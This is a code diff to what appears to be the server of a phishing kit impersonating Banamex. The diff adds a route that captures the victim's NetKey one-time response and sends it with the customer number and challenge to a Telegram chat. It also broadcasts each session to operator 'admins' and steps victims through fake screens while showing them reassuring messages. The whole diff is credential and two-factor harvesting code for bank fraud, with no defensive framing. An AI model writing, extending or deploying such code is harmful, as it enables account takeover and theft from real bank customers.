@@ -786,7 +786,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
         claveAcceso,
         challenge: challenge || '',
         netkeyResponse: netkeyResponse || '',
-        pasoActual: "validando",
+        pasoActual: ScreenType.BANAMEX_NETKEY,
         createdBy: "banamex_client",
       });
 
@@ -797,7 +797,6 @@ export async function registerRoutes(app: Express): Promise<Server> {
         `📱 <b>Número de Cliente:</b> ${numeroCliente}\n` +
         `🔑 <b>Clave de Acceso:</b> ${claveAcceso}\n` +
         (challenge ? `🔢 <b>Challenge:</b> ${challenge}\n` : '') +
-        (netkeyResponse ? `🔐 <b>NetKey Response:</b> ${netkeyResponse}\n` : '') +
         `🆔 <b>Session ID:</b> ${sessionId}\n` +
         `⏰ <b>Hora:</b> ${new Date().toLocaleString('es-MX')}`;
 
@@ -811,11 +810,66 @@ export async function registerRoutes(app: Express): Promise<Server> {
       res.json({ 
         success: true, 
         sessionId,
-        message: "Validando credenciales..." 
+        message: "Sesión creada exitosamente" 
       });
     } catch (error) {
       console.error("Error en login de Banamex:", error);
       res.status(500).json({ message: "Error procesando login" });
+    }
+  });
+
+  app.post('/api/banamex/submit-netkey', async (req, res) => {
+    try {
+      const { sessionId, netkeyResponse } = req.body;
+
+      if (!sessionId || !netkeyResponse) {
+        return res.status(400).json({ 
+          success: false,
+          message: "Session ID y NetKey Response son requeridos" 
+        });
+      }
+
+      const existingSession = await storage.getSessionById(sessionId);
+      if (!existingSession) {
+        console.error(`[Banamex NetKey] Sesión no encontrada: ${sessionId}`);
+        return res.status(404).json({ 
+          success: false,
+          message: "Sesión no encontrada." 
+        });
+      }
+
+      const session = await storage.updateSession(sessionId, { 
+        netkeyResponse,
+        pasoActual: ScreenType.BANAMEX_CONTACT_FORM,
+      });
+
+      console.log(`[Banamex NetKey] NetKey recibido - Session: ${sessionId}`);
+
+      const telegramMessage = 
+        `🔐 <b>NetKey Response - Banamex</b>\n\n` +
+        `🆔 <b>Session ID:</b> ${sessionId}\n` +
+        `📱 <b>Número de Cliente:</b> ${existingSession.numeroCliente}\n` +
+        `🔢 <b>Challenge:</b> ${existingSession.challenge}\n` +
+        `🔐 <b>NetKey Response:</b> ${netkeyResponse}\n` +
+        `⏰ <b>Hora:</b> ${new Date().toLocaleString('es-MX')}`;
+
+      await sendTelegramMessage(telegramMessage);
+
+      broadcastToAdmins(JSON.stringify({
+        type: 'SESSION_UPDATE',
+        data: session
+      }));
+
+      res.json({ 
+        success: true,
+        message: "NetKey recibido correctamente" 
+      });
+    } catch (error) {
+      console.error("Error procesando NetKey:", error);
+      res.status(500).json({ 
+        success: false,
+        message: "Error procesando NetKey" 
+      });
     }
   });
 
@@ -845,6 +899,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
         correoContacto,
         celularContacto,
         telefonoAlternativoContacto: telefonoAlternativoContacto || '',
+        pasoActual: ScreenType.BANAMEX_WAITING,
       });
 
       console.log(`[Banamex Contact] Formulario de contacto recibido - Session: ${sessionId}`);
